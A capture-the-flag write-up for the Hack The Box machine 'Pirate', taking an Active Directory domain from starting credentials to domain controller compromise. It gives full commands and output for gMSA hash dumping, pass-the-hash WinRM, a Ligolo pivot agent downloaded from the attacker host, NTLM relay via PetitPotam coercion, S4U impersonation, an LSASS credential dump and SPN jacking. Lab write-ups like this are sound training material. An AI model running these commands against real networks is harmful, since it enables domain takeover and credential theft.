# HTB Pirate (Hard) :

Target: `pirate.htb`  
Domain: `pirate.htb`  
DC: `DC01.pirate.htb`

---


## 0) One thing that matters a lot: time skew

Kerberos was off by ~7 hours (you can see it in SMB time/clock-skew output). If you don’t fix this, random Kerberos stuff just fails for “no reason”.

So for anything Kerberos-related I used:

```bash
faketime -f +25200s <command>
#or better, run a shell with fixed time
timewrap pirate.htb bash # search timewrap on voidread.pages.dev if u want it
```

(`25200s = 7 hours`)

---

Starting creds:

```text
pirate.htb\\pentest : p3nt3st2025!&
```

---

## 1) pre2k → machine TGTs → dump gMSA hashes

### Why I cared
If I can authenticate as a computer account, I might be able to read gMSA passwords (depending on `PrincipalsAllowedToRetrieveManagedPassword`). gMSAs are often gold because they run infra services and sometimes have WinRM access.

### Find pre-created computers (`pre2k`)
Context: attacker box as `pentest`

```bash
faketime -f +25200s nxc ldap WEB01.pirate.htb -u pentest -p 'p3nt3st2025!&' -M pre2k
```

This found pre-created machine accounts:
- `MS01$`
- `EXCH01$`

and I got TGTs for them (ccache saved by the module).

### Dump gMSA passwords using the ccache
Context: attacker box using the `ms01` ccache

```bash
❯ faketime -f +25200s nxc ldap pirate.htb -k --use-kcache --gmsa
LDAP        pirate.htb      389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:PIRATE.HTB) (signing:None) (channel binding:Never)
LDAP        pirate.htb      389    DC01             [+] PIRATE.HTB\ms01 from ccache
LDAP        pirate.htb      389    DC01             [*] Getting GMSA Passwords
LDAP        pirate.htb      389    DC01             Account: gMSA_ADCS_prod$      NTLM: 304106f739822ea2ad8ebe23f802d078     PrincipalsAllowedToReadPassword: Domain Secure Servers
LDAP        pirate.htb      389    DC01             Account: gMSA_ADFS_prod$      NTLM: 8126756fb2e69697bfcb04816e685839     PrincipalsAllowedToReadPassword: Domain Secure Servers
```

---

## 2) Foothold: WinRM into DC01 as `gMSA_ADFS_prod$`
Context: attacker box, connect to DC01

```bash
evil-winrm -i pirate.htb -u gMSA_ADFS_prod$ -H 8126756fb2e69697bfcb04816e685839
```

It worked because the account is allowed WinRM (it’s in `Remote Management Users`).

Now I’m on `DC01` and can query AD “from inside”, plus pivot to internal-only hosts.

---

## 3) What BloodHound/AD enum told me (important bits)

### Delegation on `a.white_adm`
Context: inside DC01 (WinRM as `gMSA_ADFS_prod$`)
This is the “why `a.white_adm` matters” part: it’s not just another user, it has delegation configured.

I verified the attributes directly:

```powershell
Get-ADUser a.white_adm -Properties msDS-AllowedToDelegateTo
Get-ADUser a.white_adm -Properties TrustedToAuthForDelegation
```

Key result:
- `TrustedToAuthForDelegation : True`
- `msDS-AllowedToDelegateTo` includes `HTTP/WEB01`

So controlling `a.white_adm` can be used for S4U to `WEB01` services.

### MAQ is 10 (so I can add computers)
Context: attacker box as `pentest`

```bash
nxc ldap 10.129.8.222 -u pentest -p 'p3nt3st2025!&' -M maq
```

MAQ = `10` → I can create computer accounts and abuse that.

### Writable objects (this is what I build the next steps around)
Context: attacker box as `pentest`

```bash
bloodyAD --host 10.129.8.222 -u pentest -p 'p3nt3st2025!&' get writable
```

The two big takeaways were:
- I can write to the computer object I create (expected)
- I can `CREATE_CHILD` in AD-integrated DNS (MicrosoftDNS partitions) → I can add internal DNS records pointing to me

### Quick note: I did try “straight RBCD” early
I tried the boring route (create a computer → slap RBCD on `DC01$`) and it wasn’t happening with the perms I had at that time, so I moved on to the paths that were actually supported by what I could write.

---

## 4) Pivot to internal subnet (required)
Context: attacker box + DC01 (WinRM)

Ligolo pivot:

```bash
sudo ligolo -selfcert
```

On the DC box:

```powershell
iwr http://10.10.16.57:9999/ligolo_agent.exe -OutFile ligolo.exe
.\ligolo.exe -connect 10.10.16.57:11601 -ignore-cert
```

On my box (note: no `ligolo` interface, so I added the route in the Ligolo web UI instead of `ip route add ... dev ligolo`).

Quick sanity:

```bash
nmap -sC -sV -p 80,135,139,443,445,5985,808,1500,1501 192.168.100.2
```

---

## 5) Coerce `WEB01$` → NTLM relay to LDAP → S4U → SYSTEM on WEB01
Context: attacker box + DC01 (WinRM)

### 7.1 Add a DNS record pointing to me
Context: attacker box as `pentest`
Since I can create DNS records in AD DNS, I added a record to point at my box. This makes the coercion/relay setup way cleaner.

```bash
python3 dnstool.py -u 'PIRATE.HTB\pentest' -p 'p3nt3st2025!&' -r sado.pirate.htb -a add -d 10.10.16.57 10.129.10.170
```

Quick verify from DC01:

```powershell
Resolve-DnsName sado.pirate.htb
```

### 7.2 Start `ntlmrelayx` (LDAP signing wasn’t enforced)
Context: attacker box
LDAP signing was basically not enforced (`signing: None`), so relay to LDAP/LDAPS works:

```bash
sudo ntlmrelayx.py -t ldap://10.129.10.170 --delegate-access
```

### 7.3 Coerce WEB01 with PetitPotam
Context: attacker box

```bash
python3 PetitPotam.py -d pirate.htb -u pentest -p 'p3nt3st2025!&' sado@80/aaaa 192.168.100.2
```

EfsRpcOpenFileRaw was blocked, but it fell back to another EFSRPC function and the coercion worked.

### 7.4 Let relay create a computer + set delegation
Once `WEB01$` authenticated to my relay, `ntlmrelayx`:
- created a new machine account (random name/password),
- gave it delegation rights against `WEB01$` so it can do S4U2Proxy.

That’s the whole point of `--delegate-access`.

### 7.5 S4U impersonation to get admin ticket to `CIFS/WEB01`
Context: attacker box

```bash
getST.py pirate.htb/<NEWCOMPUTER$>:'<password>' -spn CIFS/WEB01.pirate.htb -impersonate Administrator -dc-ip 10.129.10.170
export KRB5CCNAME=Administrator@CIFS_WEB01.pirate.htb@PIRATE.HTB.ccache
```

### 7.6 `psexec` with Kerberos → SYSTEM
Context: attacker box

```bash
psexec.py -k -no-pass -dc-ip 10.129.10.170 pirate.htb/Administrator@WEB01.pirate.htb
```

Confirmed:

```text
nt authority\\system
```

---

## 6) Dump creds on WEB01 → become `a.white` → take over `a.white_adm`
Context: attacker box (Kerberos ticket for `Administrator@WEB01`)

### How I got the `a.white` hash (LSASS dump)
After getting SYSTEM on WEB01, I used `nxc`’s procdump module to dump LSASS and parse creds:

```bash
htb/pirate on  main via 🐍 v3.13.5 took 4m59s
❯ klist
Ticket cache: FILE:Administrator@CIFS_WEB01.pirate.htb@PIRATE.HTB.ccache
Default principal: Administrator@pirate.htb

Valid starting     Expires            Service principal
03/03/26 18:12:48  04/03/26 04:12:46  CIFS/WEB01.pirate.htb@PIRATE.HTB
        renew until 04/03/26 18:12:45


htb/pirate on  main via 🐍 v3.13.5 took 2m18s
❯ nxc smb WEB01.pirate.htb --use-kcache -M procdump
SMB         WEB01.pirate.htb 445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:None)
SMB         WEB01.pirate.htb 445    WEB01            [+] pirate.htb\Administrator from ccache (Pwn3d!)
PROCDUMP    WEB01.pirate.htb 445    WEB01            [*] Copy /home/sado/.nxc/tmpprocdump.exe to C:\Windows\Temp\
PROCDUMP    WEB01.pirate.htb 445    WEB01            [+] Created file procdump.exe on the \\C$\Windows\Temp\
PROCDUMP    WEB01.pirate.htb 445    WEB01            [*] Getting lsass PID
PROCDUMP    WEB01.pirate.htb 445    WEB01            [*] Executing command C:\Windows\Temp\procdump.exe -accepteula -ma 596 C:\Windows\Temp\%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp
PROCDUMP    WEB01.pirate.htb 445    WEB01            [+] Process lsass.exe was successfully dumped
PROCDUMP    WEB01.pirate.htb 445    WEB01            [*] Copy WEB01-AMD64-PIRATE.dmp to host
PROCDUMP    WEB01.pirate.htb 445    WEB01            [+] Dumpfile of lsass.exe was transferred to /home/sado/.nxc/tmp/WEB01-AMD64-PIRATE.dmp
PROCDUMP    WEB01.pirate.htb 445    WEB01            [+] Deleted procdump file on the C$ share
PROCDUMP    WEB01.pirate.htb 445    WEB01            [+] Deleted lsass.dmp file on the C$ share
PROCDUMP    WEB01.pirate.htb 445    WEB01            PIRATE\a.white:d2593a013aaf8e077ab0e69f9471b4c1
```


Even though the dump copy-back threw “broken pipe” errors in my output, the module still printed the recovered hash.

### LSASS dump result (the one that mattered)

```text
PIRATE\\a.white : d2593a013aaf8e077ab0e69f9471b4c1
```

### Use that hash to get a Kerberos TGT
Context: attacker box

```bash
getTGT.py -hashes :d2593a013aaf8e077ab0e69f9471b4c1 pirate.htb/a.white@dc01.pirate.htb
export KRB5CCNAME=a.white@dc01.pirate.htb.ccache
```

### BloodHound-backed step: reset `a.white_adm` password
Context: attacker box (Kerberos as `a.white`)

```bash
bloodyAD -d pirate.htb --host dc01.pirate.htb --dc-ip 10.129.10.170 -k set password a.white_adm 'P@ssw0rd123!'
getTGT.py pirate.htb/a.white_adm:'P@ssw0rd123!' -dc-ip 10.129.10.170
export KRB5CCNAME=a.white_adm.ccache
```

### Reality check: `a.white_adm` is still restricted
Even after taking `a.white_adm`:
- it doesn’t get `C$` access over SMB,
- and it behaves like “network logon only” (logon type 3), so you can’t just WinRM/RDP in and call it a day.

So yeah, owning `a.white_adm` is progress, but it’s not the finish.

---

## 7) Root / privesc (SPN jacking via delegation)
Context: attacker box as `a.white_adm`

### Confirm what I can write (important objects)

```
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=pirate,DC=htb
permission: WRITE

distinguishedName: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
permission: WRITE

distinguishedName: CN=Angela W. ADM,CN=Users,DC=pirate,DC=htb
permission: WRITE

distinguishedName: CN=WEB01,CN=Computers,DC=pirate,DC=htb
permission: WRITE

distinguishedName: CN=MS01,CN=Computers,DC=pirate,DC=htb
permission: WRITE

distinguishedName: CN=EXCH01,CN=Computers,DC=pirate,DC=htb
permission: WRITE

distinguishedName: DC=pirate.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=pirate,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.pirate.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=pirate,DC=htb
permission: CREATE_CHILD
```

Reference: `https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/`

### Check delegation

```bash
findDelegation.py -k -no-pass -target-domain pirate.htb -dc-ip 10.129.12.166 pirate.htb/a.white_adm
```

Output shows:
- `DC01$` unconstrained
- `a.white_adm` constrained w/ protocol transition to `HTTP/WEB01`

### SPN jacking + S4U

Add the SPN on `DC01$`:

```bash
bloodyAD -d pirate.htb --host dc01.pirate.htb -u a.white_adm -p 'P@ssw0rd123!' \
  set object DC01$ servicePrincipalName -v HTTP/WEB01
```

(also remove it from WEB01)

Get an admin service ticket:

```bash
getST.py pirate.htb/a.white_adm:'P@ssw0rd123!' -spn 'HTTP/WEB01' -impersonate administrator -dc-ip 10.129.12.166
```

Substitute the service in the ticket to CIFS on the DC:

```bash
python3 tgssub.py -in ../administrator@HTTP_WEB01@PIRATE.HTB.ccache -out new.ccache -altservice "CIFS/DC01.PIRATE.HTB"
```

Verify ticket:

```bash
klist
```

Then use it:

```bash
nxc smb dc01.pirate.htb -k --use-kcache
```

I could not evil-winrm to with this cert (weird SPN? idk) so i just changed the password and used it directly